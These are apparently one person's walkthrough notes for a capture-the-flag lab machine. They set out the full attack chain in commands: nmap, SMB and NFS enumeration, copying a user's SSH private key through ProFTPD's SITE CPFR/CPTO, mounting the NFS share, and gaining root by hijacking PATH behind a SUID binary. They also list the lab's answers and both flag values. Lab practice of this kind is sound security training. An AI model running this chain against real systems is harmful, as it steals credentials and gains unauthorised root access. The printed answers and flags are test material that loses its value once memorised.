
ip addr
10.10.88.135

nmap scan

`sudo nmap -sC -sV -oN nmap/initial 10.10.88.135`

---
## Task 1

### Scan the machine with nmap, how many ports are open?
    7

---

## Task 2

nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.88.135

### Using the nmap command above, how many shares have been found?
    3


`smbclient //10.10.88.135/anonymous`


### Once you're connected, list the files on the share. What is the file can you see?
    log.txt

### What port is FTP running on?
    21

`smbget -R smb://10.10.88.135/anonymous `

`nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.88.135`

### What mount can we see?
    /var

## Task 3
### Proftpd 
    ProFtpd is a free and open-source FTP server, compatible with Unix and Windows systems. Its also been vulnerable in the past software versions.

### connect netcat ftp server

`nc 10.10.88.135 21`

### What is the version?
    1.3.5

### How many exploits are there for the ProFTPd running?
    3

### steal the private rsa_id 

`SITE CPFR /home/kenobi/.ssh/id_rsa`

350 File or directory exists, ready for destination name

`SITE CPTO /var/tmp/id_rsa`

250 Copy successful

### mount /var/tmp

`sudo mkdir /mnt/kenobiMNT`

`sudo mount 10.10.88.135:/var /mnt/kenobiMNT/`

    mount: /mnt/kenobiMNT: bad option; for several filesystems (e.g. nfs, cifs) you might need a /sbin/mount.<type> helper program.

`sudo apt install nfs-common`

`ls -l /mnt/kenobiMNT/`

`cp /mnt/kenobiMNT/tmp/id_rsa .`

`sudo chmod 600 id_rsa `

`ssh -i id_rsa kenobi@10.10.88.135`

`kenobi@kenobi:~$ pwd`

    /home/kenobi

`cat user.txt`
    
### Flag #1
    d0b0f3f53b6caa532a83915e19224899


## Task 4
### Priv Esc using suid
### suid - User executes the file with permissions of the file owner 

`find / -perm -u=s -type f 2>/dev/null`

### What file looks particularly out of the ordinary? 
    /usr/bin/menu

`strings /usr/bin/menu`
    
    curl -I localhost
    
    uname -r
    
    ifconfig

`cd tmp`

`echo /bin/sh > curl`

`chmod 777 curl`

`export PATH=/tmp:$PATH`

`/usr/bin/menu`

`cat /root/root.txt`

### Flag #2
    177b3cd8562289f37382721c28381f02
